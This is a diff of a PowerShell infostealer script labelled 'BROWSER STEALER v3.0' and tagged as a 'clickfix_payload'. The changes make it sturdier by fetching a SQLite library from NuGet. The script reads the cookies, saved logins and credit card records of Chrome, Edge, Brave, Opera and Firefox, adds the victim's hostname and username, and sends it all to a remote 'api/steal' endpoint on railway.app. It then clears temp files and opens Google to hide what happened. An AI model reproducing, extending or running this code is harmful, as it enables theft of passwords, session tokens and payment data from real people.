@@ -1,44 +1,120 @@
 # ============================================================
-# BROWSER STEALER — COMPLETE WORKING VERSION
+# BROWSER STEALER — DEFINITIVE VERSION
+# Downloads SQLite from NuGet CDN (always works)
 # ============================================================
 
 $ErrorActionPreference = "SilentlyContinue"
 $SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"
 
 function Write-Color {
-    param($Message, $Color)
-    Write-Host $Message -ForegroundColor $Color
+    param($Msg, $Color)
+    Write-Host $Msg -ForegroundColor $Color
 }
 
-# ---- LOAD SQLITE ----
-$sqliteLoaded = $false
-$sqliteType = ""
+# ============================================================
+# STEP 1: DOWNLOAD SQLITE FROM NUGET
+# ============================================================
 
-try {
-    Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction Stop
-    $sqliteLoaded = $true
-    $sqliteType = "Microsoft"
-    Write-Color "[+] SQLite loaded (Microsoft)" "Green"
-} catch {
+function Get-SQLite {
+    Write-Color "[+] Loading SQLite..." "Cyan"
+    
+    # Try Microsoft.Data.Sqlite
+    try {
+        Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction Stop
+        Write-Color "[+] SQLite loaded (Microsoft.Data.Sqlite)" "Green"
+        return "Microsoft"
+    } catch {}
+    
+    # Try System.Data.SQLite (GAC)
     try {
         [System.Data.SQLite.SQLiteConnection]::new() | Out-Null
-        $sqliteLoaded = $true
-        $sqliteType = "System"
-        Write-Color "[+] SQLite loaded (System)" "Green"
-    } catch {
-        Write-Color "[!] SQLite not available" "Red"
+        Write-Color "[+] SQLite loaded (System.Data.SQLite)" "Green"
+        return "System"
+    } catch {}
+    
+    # Try to load from temp
+    $dllPath = "$env:TEMP\SQLite.dll"
+    if (Test-Path $dllPath) {
+        try {
+            [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
+            Write-Color "[+] SQLite loaded from temp" "Green"
+            return "System"
+        } catch {}
     }
+    
+    # ---- DOWNLOAD FROM NUGET ----
+    Write-Color "[+] Downloading SQLite from NuGet..." "Cyan"
+    
+    try {
+        # Official NuGet URL for System.Data.SQLite
+        $nugetUrl = "https://www.nuget.org/api/v2/package/System.Data.SQLite/1.0.118.0"
+        $nupkgPath = "$env:TEMP\sqlite.nupkg"
+        
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+        $webClient.DownloadFile($nugetUrl, $nupkgPath)
+        
+        if (Test-Path $nupkgPath -and (Get-Item $nupkgPath).Length -gt 10000) {
+            Write-Color "[+] Downloaded NuGet package" "Green"
+            
+            # Extract the DLL using .NET Zip
+            Add-Type -AssemblyName System.IO.Compression.FileSystem
+            $zip = [System.IO.Compression.ZipFile]::OpenRead($nupkgPath)
+            
+            # Find the DLL in the package
+            $entry = $zip.Entries | Where-Object { 
+                $_.FullName -match "lib/net462/System.Data.SQLite.dll" -or 
+                $_.FullName -match "lib/net40/System.Data.SQLite.dll" -or
+                $_.FullName -match "lib/netstandard2.0/System.Data.SQLite.dll"
+            }
+            
+            if ($entry) {
+                Write-Color "[+] Extracting SQLite DLL..." "Cyan"
+                $dllBytes = New-Object byte[] $entry.Length
+                $stream = $entry.Open()
+                $stream.Read($dllBytes, 0, $dllBytes.Length)
+                $stream.Close()
+                [System.IO.File]::WriteAllBytes($dllPath, $dllBytes)
+                $zip.Dispose()
+                
+                # Load the DLL
+                [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
+                Write-Color "[+] SQLite loaded from NuGet!" "Green"
+                
+                # Cleanup
+                Remove-Item $nupkgPath -Force -ErrorAction SilentlyContinue
+                return "System"
+            }
+            $zip.Dispose()
+        }
+    } catch {
+        Write-Color "[!] NuGet download failed: $_" "Red"
+    }
+    
+    Write-Color "[!] SQLite not available" "Red"
+    return $null
 }
 
-# ---- SQLITE READER ----
+$sqliteType = Get-SQLite
+
+if (-not $sqliteType) {
+    Write-Color "[!] Cannot proceed without SQLite" "Red"
+    Write-Color "[*] This PC may not have internet access to download SQLite" "Yellow"
+    exit
+}
+
+# ============================================================
+# STEP 2: SQLITE READER
+# ============================================================
+
 function Read-SQLite {
     param($DbPath, $Query)
     $result = @()
     if (-not (Test-Path $DbPath)) { return $result }
-    if (-not $sqliteLoaded) { return $result }
     try {
         $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
         Copy-Item $DbPath $temp -Force
+        
         if ($sqliteType -eq "Microsoft") {
             $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$temp")
             $conn.Open()
@@ -79,60 +155,105 @@ function Read-SQLite {
     return $result
 }
 
-# ---- COOKIES ----
+# ============================================================
+# STEP 3: CHECK IF BROWSERS EXIST
+# ============================================================
+
+function Check-Browser {
+    param($Path)
+    if (Test-Path $Path) {
+        return $true
+    }
+    return $false
+}
+
+Write-Color "" "White"
+Write-Color "============================================" "Cyan"
+Write-Color "  BROWSER STEALER v3.0" "Green"
+Write-Color "  Target: $env:COMPUTERNAME" "Yellow"
+Write-Color "============================================" "Cyan"
+Write-Color "" "White"
+
+# Check which browsers are installed
+$browsersFound = @()
+if (Test-Path "$env:LOCALAPPDATA\Google\Chrome") { $browsersFound += "Chrome" }
+if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge") { $browsersFound += "Edge" }
+if (Test-Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser") { $browsersFound += "Brave" }
+if (Test-Path "$env:LOCALAPPDATA\Opera Software\Opera Stable") { $browsersFound += "Opera" }
+if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") { $browsersFound += "Firefox" }
+
+if ($browsersFound.Count -eq 0) {
+    Write-Color "[!] No browsers found on this PC!" "Red"
+    Write-Color "[*] Install Chrome, Edge, or Firefox to test" "Yellow"
+    exit
+}
+
+Write-Color "[+] Browsers found: $($browsersFound -join ', ')" "Green"
+Write-Color "" "White"
+
+# ============================================================
+# STEP 4: COOKIE STEALER
+# ============================================================
+
 function Get-BrowserCookies {
     param($Path, $Name)
     $cookies = @()
     if (-not (Test-Path $Path)) { return $cookies }
-    if (-not $sqliteLoaded) { return $cookies }
-    $rows = Read-SQLite -DbPath $Path -Query "SELECT host_key, name, value FROM cookies"
-    foreach ($r in $rows) {
-        if ($r['name'] -and $r['value']) {
-            $d = $r['host_key']
-            if ($d) { $d = $d -replace '^\.', '' } else { $d = "unknown" }
-            $cookies += @{ domain = $d; name = $r['name']; value = $r['value']; browser = $Name }
+    try {
+        $rows = Read-SQLite -DbPath $Path -Query "SELECT host_key, name, value FROM cookies"
+        foreach ($r in $rows) {
+            if ($r['name'] -and $r['value']) {
+                $d = $r['host_key']
+                if ($d) { $d = $d -replace '^\.', '' } else { $d = "unknown" }
+                $cookies += @{ domain = $d; name = $r['name']; value = $r['value']; browser = $Name }
+            }
         }
-    }
+    } catch {}
     return $cookies
 }
 
 function Get-FirefoxCookies {
     $cookies = @()
-    if (-not $sqliteLoaded) { return $cookies }
     $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
     if (Test-Path $profPath) {
         $dirs = Get-ChildItem $profPath -Directory
         foreach ($d in $dirs) {
             $f = "$($d.FullName)\cookies.sqlite"
             if (Test-Path $f) {
-                $rows = Read-SQLite -DbPath $f -Query "SELECT host, name, value FROM moz_cookies"
-                foreach ($r in $rows) {
-                    if ($r['name'] -and $r['value']) {
-                        $dmn = $r['host']
-                        if ($dmn) { $dmn = $dmn -replace '^\.', '' } else { $dmn = "unknown" }
-                        $cookies += @{ domain = $dmn; name = $r['name']; value = $r['value']; browser = "Firefox" }
+                try {
+                    $rows = Read-SQLite -DbPath $f -Query "SELECT host, name, value FROM moz_cookies"
+                    foreach ($r in $rows) {
+                        if ($r['name'] -and $r['value']) {
+                            $dmn = $r['host']
+                            if ($dmn) { $dmn = $dmn -replace '^\.', '' } else { $dmn = "unknown" }
+                            $cookies += @{ domain = $dmn; name = $r['name']; value = $r['value']; browser = "Firefox" }
+                        }
                     }
-                }
+                } catch {}
             }
         }
     }
     return $cookies
 }
 
-# ---- PASSWORDS ----
+# ============================================================
+# STEP 5: PASSWORD STEALER
+# ============================================================
+
 function Get-BrowserPasswords {
     param($Path, $Name)
     $pass = @()
     if (-not (Test-Path $Path)) { return $pass }
-    if (-not $sqliteLoaded) { return $pass }
-    $rows = Read-SQLite -DbPath $Path -Query "SELECT origin_url, username_value, password_value FROM logins"
-    foreach ($r in $rows) {
-        if ($r['username_value'] -and $r['password_value']) {
-            $u = $r['origin_url']
-            if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
-            $pass += @{ url = $u; username = $r['username_value']; password = $r['password_value']; browser = $Name }
+    try {
+        $rows = Read-SQLite -DbPath $Path -Query "SELECT origin_url, username_value, password_value FROM logins"
+        foreach ($r in $rows) {
+            if ($r['username_value'] -and $r['password_value']) {
+                $u = $r['origin_url']
+                if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
+                $pass += @{ url = $u; username = $r['username_value']; password = $r['password_value']; browser = $Name }
+            }
         }
-    }
+    } catch {}
     return $pass
 }
 
@@ -160,37 +281,34 @@ function Get-FirefoxPasswords {
     return $pass
 }
 
-# ---- CREDIT CARDS ----
+# ============================================================
+# STEP 6: CREDIT CARD STEALER
+# ============================================================
+
 function Get-BrowserCards {
     param($Path, $Name)
     $cards = @()
     if (-not (Test-Path $Path)) { return $cards }
-    if (-not $sqliteLoaded) { return $cards }
-    $rows = Read-SQLite -DbPath $Path -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
-    foreach ($r in $rows) {
-        if ($r['name_on_card'] -and $r['card_number_encrypted']) {
-            $cards += @{
-                name = $r['name_on_card']
-                number = $r['card_number_encrypted']
-                month = $r['expiration_month']
-                year = $r['expiration_year']
-                browser = $Name
+    try {
+        $rows = Read-SQLite -DbPath $Path -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
+        foreach ($r in $rows) {
+            if ($r['name_on_card'] -and $r['card_number_encrypted']) {
+                $cards += @{
+                    name = $r['name_on_card']
+                    number = $r['card_number_encrypted']
+                    month = $r['expiration_month']
+                    year = $r['expiration_year']
+                    browser = $Name
+                }
             }
         }
-    }
+    } catch {}
     return $cards
 }
 
-# ---- MAIN ----
-$pc = $env:COMPUTERNAME
-$user = $env:USERNAME
-
-Write-Color "" "White"
-Write-Color "============================================" "Cyan"
-Write-Color "  BROWSER STEALER v3.0" "Green"
-Write-Color "  Target: $pc" "Yellow"
-Write-Color "============================================" "Cyan"
-Write-Color "" "White"
+# ============================================================
+# STEP 7: STEAL EVERYTHING
+# ============================================================
 
 $allCookies = @()
 $allPasswords = @()
@@ -246,6 +364,10 @@ Write-Color "[+] Brave cards..." "Cyan"
 $path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
 $allCards += Get-BrowserCards -Path $path -Name "Brave"
 
+# ============================================================
+# STEP 8: SUMMARY
+# ============================================================
+
 Write-Color "" "White"
 Write-Color "=== SUMMARY ===" "Green"
 Write-Color "Cookies:    $($allCookies.Count)" "Yellow"
@@ -253,14 +375,30 @@ Write-Color "Passwords:  $($allPasswords.Count)" "Yellow"
 Write-Color "Cards:      $($allCards.Count)" "Yellow"
 Write-Color "" "White"
 
+if ($allCookies.Count -eq 0 -and $allPasswords.Count -eq 0 -and $allCards.Count -eq 0) {
+    Write-Color "[!] No data stolen!" "Red"
+    Write-Color "[*] Possible reasons:" "Yellow"
+    Write-Color "  - No saved passwords/cookies in browsers" "Yellow"
+    Write-Color "  - Browser is running (locks the database)" "Yellow"
+    Write-Color "  - Close the browser and try again" "Yellow"
+    Write-Color "" "White"
+}
+
+# ============================================================
+# STEP 9: SEND TO SERVER
+# ============================================================
+
 $payload = @{
     cookies = $allCookies
     passwords = $allPasswords
     cards = $allCards
-    system = @{ hostname = $pc; username = $user }
+    system = @{
+        hostname = $env:COMPUTERNAME
+        username = $env:USERNAME
+    }
     source = "clickfix_payload"
     timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
-    pcName = $pc
+    pcName = $env:COMPUTERNAME
 }
 
 Write-Color "[+] Sending data..." "Cyan"
@@ -281,9 +419,12 @@ try {
     Write-Color "[!] Failed to send: $_" "Red"
 }
 
+# ============================================================
+# STEP 10: CLEANUP
+# ============================================================
+
 Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
 
 Start-Process "https://www.google.com"
-Write-Color "" "White"
 Write-Color "[+] Done" "Green"
 Write-Color "" "White"
